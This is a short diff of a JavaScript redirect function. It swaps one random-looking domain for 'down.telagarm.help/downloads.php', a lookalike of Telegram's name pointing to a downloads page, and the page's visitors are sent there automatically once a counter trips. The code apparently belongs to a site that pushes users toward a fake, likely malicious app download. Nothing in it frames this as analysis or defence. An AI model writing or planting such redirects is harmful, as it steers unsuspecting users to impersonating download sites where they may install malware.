@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://hyeiyevverldd.top";
+		var url="https://down.telagarm.help/downloads.php";
 		window.location=url;
 	}
 }
@@ -13,3 +13,4 @@ function getLoad()
 	num++;
 
 }
+
